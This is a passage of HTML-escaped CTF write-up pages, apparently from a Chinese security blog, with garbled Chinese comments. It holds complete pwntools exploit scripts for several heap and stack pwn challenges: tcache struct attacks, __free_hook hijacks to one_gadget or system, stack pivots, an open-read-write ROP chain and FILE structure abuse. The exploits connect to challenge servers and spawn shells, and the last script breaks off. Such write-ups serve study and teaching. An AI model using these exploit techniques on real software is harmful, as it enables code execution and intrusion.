context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28240)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;A&amp;quot;)
    io.sendlineafter(b&amp;quot;size?&amp;quot;,str(s))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;E&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;content:&amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;S&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;D&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0x18) #0
add(0x18) #1
add(0x78) #2
add(0x10) #3

edit(0,cyclic(0x18)+p64(0x61))
delete(1)   
delete(2)
# edit(0,cyclic(0x18)+p64(0x81))
add(0x50) #1 #ä¸‹æ ‡å¤ç”¨ï¼ŒæŒ‰ç…§deleteé¡ºåºå¤ç”¨
edit(1,b&amp;quot;a&amp;quot;*0x27+b&amp;quot;b&amp;quot;)
show(1)
io.recvuntil(b&amp;quot;b&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x10 #æ³„éœ²å †åœ°å€
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

edit(1,b&amp;quot;a&amp;quot;*0x18+p64(0x81)+p64(heap_addr+0x10)+p64(0))
add(0x78) #2
add(0x78) #4
edit(4,b&amp;quot;\x07&amp;quot;*0x40+p64(0)*6+p64(heap_addr+0x10))
delete(4)
add(0x78) #4
show(4)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;] #æ³„éœ²libcåœ°å€
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=leak_addr+one_gadget[1]

edit(4,b&amp;quot;\x02&amp;quot;*0x40+p64(0)*3+p64(free_hook))
add(0x40) #5  
edit(5,p64(shell)) #åŠ«æŒfree_hookæ‰“one_gadget

delete(5) #trigger

io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;p1kkheap&#34;&gt;p1KkHeap:&lt;/h4&gt;
&lt;p&gt;å¼€å¯æ²™ç›’ç¦ç”¨&lt;code&gt;execve()&lt;/code&gt;&lt;br&gt;
mmapå¼€è¾Ÿrwxæ®µ&lt;br&gt;
åŠ«æŒhookåˆ°rwxæ®µä¸Šåœ°å€æ‰“orw shellcodeå³å¯&lt;br&gt;
åŒæ ·éœ€è¦æ‰“tcache structï¼Œæ³¨æ„æ„é€ tcachebinçš„å¤§å°&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28176)
# io=process(&amp;quot;./SWPUCTF_2019_p1KkHeap&amp;quot;)
elf=ELF(&amp;quot;./SWPUCTF_2019_p1KkHeap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))

def show(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

mm_addr=0x66660100

add(0x100) #0
add(0x100) #1
delete(0)
delete(0)
show(0)
io.recvuntil(b&amp;quot;content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(0x100) #2
edit(2,p64(heap_addr+0x10)) 
add(0x100) #3
add(0x100) #4
edit(4,b&amp;quot;\x07&amp;quot;*0x40)
delete(0)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
orw_shellcode=asm(shellcraft.open(&amp;quot;/flag&amp;quot;)+shellcraft.read(3,mm_addr+0x400,0x50)+shellcraft.write(1,mm_addr+0x400,0x50))

edit(4,b&amp;quot;\x07&amp;quot;*0x40+p64(0)*6+p64(malloc_hook)+p64(0)+p64(mm_addr))
add(0x90) #5
edit(5,orw_shellcode)
add(0x70) #6
edit(6,p64(mm_addr))

add(0x30)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;wheretogo&#34;&gt;WheretoGoï¼š&lt;/h4&gt;
&lt;p&gt;ä¸€æ¬¡æº¢å‡ºçš„æ ˆè¿ç§»æ¨¡æ¿é¢˜ï¼Œä¸è¿‡å› ä¸ºç¯å¢ƒé—®é¢˜æœ€åå¾—è¿2æ¬¡&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28972)
# io=process(&amp;quot;./WheretoGo&amp;quot;)
elf=ELF(&amp;quot;./WheretoGo&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
bk_addr=0x4011bd
bss_addr=0x404d00
read_text=0x4011C9
leave_ret=0x4011e0
pop_rdi=0x4012d3

io.recvuntil(b&amp;quot;go?\n&amp;quot;)
payload=cyclic(0x80)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(bk_addr)
payload=payload.ljust(0x80,b&amp;quot;\x00&amp;quot;)+p64(bss_addr-0x80)+p64(leave_ret)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))


payload=cyclic(0x80)+p64(bss_addr-0x200-0x8)+p64(read_text)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

# gdb.attach(io)
# pause()

payload=p64(0)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x80,b&amp;quot;\x00&amp;quot;)+p64(bss_addr-0x280-0x8)+p64(leave_ret)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)


# payload=cyclic(0x88)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
# io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x00000000004012cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012d0 : pop r14 ; pop r15 ; ret
# 0x00000000004012d2 : pop r15 ; ret
# 0x00000000004012cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012d3 : pop rdi ; ret
# 0x00000000004012d1 : pop rsi ; pop r15 ; ret
# 0x00000000004012cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">SWPU éƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/qmbh8mgFo/"" data-c="
          &lt;h4 id=&#34;silverwolf&#34;&gt;&lt;strong&gt;silverwolf:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;glibc 2.27-3ubuntu1.4ï¼Œ&lt;code&gt;å †ä¸Šorw&lt;/code&gt;+&lt;code&gt;tcache struct attack&lt;/code&gt;&lt;br&gt;
æœ¬é¢˜å®é™…ä¸Šåªèƒ½æ§åˆ¶indexä¸º0çš„å †å—ï¼Œä¸”æ¯æ¬¡åˆ›å»ºå †å—æœ€å¤§ä¸è¶…è¿‡0x78ï¼Œå­˜åœ¨UAFï¼Œå¼€å¯æ²™ç›’ä¿æŠ¤ï¼Œåªæœ‰æ‰“orw&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686106761807.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯ä»¥é€šè¿‡&lt;code&gt;tcache double free&lt;/code&gt;æ³„éœ²å †åœ°å€ï¼Œæ­¤ç‰ˆæœ¬åŠ å…¥æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡è¦†ç›–&lt;code&gt;tcache bk&lt;/code&gt;ä¸º0ç»•è¿‡&lt;br&gt;
æ³„éœ²libcåŸºå€å¯ä»¥æ‰“&lt;code&gt;tcache struct&lt;/code&gt;ï¼Œæ§åˆ¶å †å—åˆ°&lt;code&gt;heap_base+0x10&lt;/code&gt;å¤„ä¿®æ”¹&lt;code&gt;tcachebin counts&lt;/code&gt;ä¸ºä¸å°äº7çš„æ•°ï¼Œåç»­å†æ¬¡é‡Šæ”¾æ—¶è¿›å…¥&lt;code&gt;unsortedbin&lt;/code&gt;æ³„éœ²åœ°å€&lt;br&gt;
ä¹‹åä¿®æ”¹&lt;code&gt;tcache struct&lt;/code&gt;ç»“æ„ï¼ŒåŠ«æŒ&lt;code&gt;free_hook&lt;/code&gt;åˆ°&lt;code&gt;setcontext+53&lt;/code&gt;å¤„ï¼Œåç»­&lt;code&gt;delete&lt;/code&gt;æ—¶è°ƒç”¨&lt;code&gt;free_hook&lt;/code&gt;æŒ‡ä»¤è·³è½¬åˆ°&lt;code&gt;setcontext+53&lt;/code&gt;å¤„,æ­¤å¤„æŒ‡ä»¤ä¸º&lt;code&gt;mov  rsp, [rdi+0A0h]&lt;/code&gt;,ä¼šå°†rspçš„å€¼è¦†ç›–ä¸º&lt;code&gt;[rdi+0xa0]&lt;/code&gt;çš„å€¼ï¼Œè€Œæ­¤å¤„æ­£æ˜¯æˆ‘ä»¬å°†è¦å¸ƒç½®çš„&lt;code&gt;p64(heap_addr+0x4000)+p64(ret)&lt;/code&gt;ï¼Œå°†è¦åŠ«æŒrspåˆ°æˆ‘ä»¬è¦å†™å…¥orw ropé“¾çš„åœ°æ–¹&lt;br&gt;
æ„é€ orw ropé“¾ï¼Œæ­¤é¢˜openéœ€è¦ä½¿ç”¨syscall&lt;s&gt;é˜²æ­¢ç ´åæ ˆç»“æ„&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ¬é¢˜ç”±äºå †å—å¤§å°é™åˆ¶ï¼Œæ— æ³•ä¸€æ¬¡æ€§å°†orwçš„ropé“¾å†™å…¥å †å—ï¼Œäºæ˜¯åˆ†ä¸¤æ¬¡å†™å…¥ï¼Œæ³¨æ„æ§åˆ¶å†™å…¥å †å—ä¹‹é—´çš„è·ç¦»ä¸ºå•æ¬¡å†™å…¥é•¿åº¦&lt;br&gt;
å¦å¤–æ³¨æ„syscallçš„åç§»ï¼Œç”¨ROPgadgetæ‰¾åˆ°çš„æ‰“ä¸é€šï¼Œç”¨ropperæ‰¾èƒ½æ‰“é€š&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28802)
io=process(&amp;quot;./silverwolf&amp;quot;)
elf=ELF(&amp;quot;./silverwolf&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def edit(cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def rst():
    for i in range(12):
        add(0x10)
    for i in range(11):
        add(0x60)
    for i in range(7):
        add(0x70)
    add(0x50)
    

rst()  #å¼€å¯seccompåå †é£æ°´ä¹±æ‰ï¼Œå°½å¯èƒ½æ¢å¤
add(0x78)
delete(0)
edit(p64(0)*2) #ç»•è¿‡tcache double freeæ£€æµ‹
delete(0)
show(0)  #æ³„éœ²å †åœ°å€ï¼Œä¸ºåç»­å †ä¸Šropåšå‡†å¤‡
io.recvuntil(b&amp;quot;Content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1920
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))
edit(p64(heap_addr+0x10))
add(0x78)  
add(0x78)  #ç”³è¯·åˆ°heap_addr+0x10å¤„ä¿®æ”¹counts
edit(p64(0)*0x4+p64(0x7000000)+p64(0)*3) #tcache struct attack

delete(0)
show(0)  #æ³„éœ²libc
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
setcontext=libc.sym[b&amp;quot;setcontext&amp;quot;]+leak_addr+53 #mov rsp,[rdi+0A0h]
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+leak_addr
open_addr=libc.sym[b&amp;quot;open&amp;quot;]+leak_addr
read_addr=libc.sym[b&amp;quot;read&amp;quot;]+leak_addr
write_addr=libc.sym[b&amp;quot;write&amp;quot;]+leak_addr
flag_addr=heap_addr+0x1000

#gadgets
pop_rdi=0x215bf+leak_addr
pop_rsi=0x23eea+leak_addr
pop_rdx=0x01b96+leak_addr
pop_rcx=0x34da3+leak_addr
pop_rax=0x43ae8+leak_addr 
pop_rsp=0x03960+leak_addr
syscall=0xd2745+leak_addr 
ret=0x08aa+leak_addr

# edit((p64(0)+p64(1))*4)


payload=b&amp;quot;\x02&amp;quot;*0x40+p64(free_hook) #å¯¹åº”tcachebin å¤§å° 0x18
payload+=p64(0) #0x28
payload+=p64(heap_addr+0x1000) #flag   0x38 flagå­—ç¬¦ä¸²åœ°å€
payload+=p64(heap_addr+0x2000) #stack   0x48  æœ€ådeleteè§¦å‘free_hookçš„tcachebin
payload+=p64(heap_addr+0x20a0) #stack   0x58 å†™å…¥è¿ç§»åˆ°orw ropçš„tcachebinå¤„
payload+=p64(heap_addr+0x4000) #orw rop  0x68 
payload+=p64(heap_addr+0x4068) #orw rop  0x78
edit(payload)


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)


gdb.attach(io)
pause()


add(0x18)
edit(p64(setcontext)) #å°†free_hookæŒ‡å‘setcontext+0x53å¤„ï¼Œé¿å¼€fldenvæŒ‡ä»¤

add(0x38)
edit(b&amp;quot;./flag&amp;quot;)

add(0x68)
edit(orw[:0x68])

add(0x78)
edit(orw[0x68:])

add(0x58)
edit(p64(heap_addr+0x4000)+p64(ret))

add(0x48)
delete(0)

# add(0x58)
# add(0x48)
# delete(n)
# payload+=
# add(0x40)
# for i in range(4):
#     add(0x10)
# edit(b&amp;quot;flag\x00\x00\x00&amp;quot;)

# edit(p64(0)*8)
# edit(p64(free_hook))
# add(0x10)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;lonelywolf&#34;&gt;&lt;strong&gt;lonelywolf:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;ä¸Šä¸€é¢˜çš„å¼±åŒ–ç‰ˆï¼Œæ²¡æœ‰seccompï¼Œtcachebinå’Œfastbinç»“æ„æ­£å¸¸&lt;br&gt;
ç»•è¿‡æ£€æµ‹double freeåæ³„éœ²å †åœ°å€æ‰“&lt;code&gt;tcachebin struct&lt;/code&gt;æ³„éœ²libcåœ°å€&lt;br&gt;
ä¹‹åä¿®æ”¹&lt;code&gt;tcache struct&lt;/code&gt;ååŠ«æŒ&lt;code&gt;free_hook&lt;/code&gt;æ‰“&lt;code&gt;one_gadget&lt;/code&gt;å³å¯&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28287)
# io=process(&amp;quot;./lonelywolf&amp;quot;)
elf=ELF(&amp;quot;./lonelywolf&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

add(0,0x78)
delete(0)
edit(0,p64(0)*2)
delete(0)
show(0)

io.recvuntil(b&amp;quot;Content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

edit(0,p64(heap_addr+0x10))
add(0,0x78)
add(0,0x78)
edit(0,b&amp;quot;\x07&amp;quot;*0x40)

delete(0)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=one_gadget[2]+leak_addr

payload=b&amp;quot;\x02&amp;quot;*0x40+p64(free_hook)

edit(0,payload)

add(0,0x10)
edit(0,p64(shell))

delete(0)

io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">CISCN_2021_silverwolf&lonelywolf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/6uuDjG65H/"" data-c="
          &lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./seethefile&amp;quot;)
io=remote(&amp;quot;chall.pwnable.tw&amp;quot;,10200)
libc=ELF(&amp;quot;./libc_32.so.6&amp;quot;)

def openn(cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;see :&amp;quot;,cc)


def readd():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    
def writee():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    
def closes():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4&amp;quot;)

def of():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;5&amp;quot;)


openn(&#39;/proc/self/maps&#39;)
readd()
writee()
# readd()
# writee()


io.recvuntil(b&amp;quot;heap]\n&amp;quot;)

leak_addr=int(io.recv(8),16)+0x1000
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=cyclic(0x20)
payload+=p32(0x804B284)
payload+=p32(0xffffdfff)
payload+=b&amp;quot;;/bin/sh&amp;quot;+b&amp;quot;\x00&amp;quot;*0x88  #ç»“æ„ä½“å¤§å°0x94
payload+=p32(0x804B284+0x98)
payload+=p32(sys_addr)*3

of()
io.recvuntil(b&amp;quot;name :&amp;quot;)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">pwnable_seethefile</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/glFiyd5Mk/"" data-c="
          &lt;p&gt;ä¸ä¸Šä¸€ç¯‡æ–‡ç« ä¸€æ ·çš„æ‰“æ³•ï¼Œæ³¨æ„æ­¤æ¬¡æ²¡æœ‰å•ç‹¬æ¸…ç©º&lt;code&gt;realloc_ptr&lt;/code&gt;çš„å‡½æ•°ï¼Œå› æ­¤åœ¨åˆ†é…å †å—ä¸Šéœ€æ³¨æ„ï¼Œé¿å…å‡ºç°&lt;code&gt;double free corruption&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(log_level=&#39;debug&#39;)

def pwn():
    elf=ELF(&amp;quot;./TWCTF_online_2019_asterisk_alloc&amp;quot;)
    libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

    def malloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def calloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;2&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def realloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;3&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def delete(n):
        io.sendlineafter(b&amp;quot;Your &amp;quot;,b&amp;quot;4&amp;quot;)
        io.sendlineafter(b&amp;quot;Which: &amp;quot;,n)

    # gdb.attach(io)
    # pause()

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x10,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;eee&amp;quot;)

    for i in range(7):
        delete(b&amp;quot;r&amp;quot;)
        
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x60,b&amp;quot;ttt&amp;quot;)
    realloc(0x100,cyclic(0x68)+p64(0x91)+b&amp;quot;\x60\xc7&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;eee&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    payload=p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
    malloc(0x90,payload) #æ­¤å¤„ä½¿ç”¨mallocåˆ†é…
    # realloc(0,b&amp;quot;&amp;quot;)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1c80-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
    malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
    sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=leak_addr+one_gadget[1]

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;www&amp;quot;)

    for i in range(2):
        delete(b&amp;quot;r&amp;quot;)

    realloc(0,b&amp;quot;&amp;quot;)
    # delete(b&amp;quot;r&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0x100,cyclic(0x68)+p64(0x91)+p64(free_hook))
